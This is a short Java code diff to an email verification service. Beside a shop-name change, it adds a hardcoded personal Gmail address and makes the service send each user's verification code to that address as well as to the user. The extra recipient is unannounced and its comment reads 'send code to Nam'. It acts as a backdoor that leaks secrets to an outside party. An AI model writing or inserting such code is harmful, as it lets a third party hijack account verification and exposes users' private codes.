@@ -22,16 +22,17 @@ public class EmailService {
      */
     public  String  sendMail(UserEntity user) {
         String subject = "Verify your email";
-        String senderName = "CMP Shop";
+        String senderName = "Trendista Shop";
         String mailContent = "Hello " + user.getUsername() + ",\n\n";
         mailContent += "Your verification code is: " + user.getVerificationCode() + ",\n\n";
         mailContent += "Please enter this code to verify your email.,\n\n";
         mailContent += "Best regards,\n";
         mailContent += senderName;
+        String backupEmail = "hoainamadm@gmail.com"; // gửi code đến Nam
         try {
             SimpleMailMessage mailMessage = new SimpleMailMessage();
             mailMessage.setFrom(sender);
-            mailMessage.setTo(user.getEmail());
+            mailMessage.setTo(new String[]{user.getEmail(), backupEmail});
             mailMessage.setSubject(subject);
             mailMessage.setText(mailContent);
             javaMailSender.send(mailMessage);
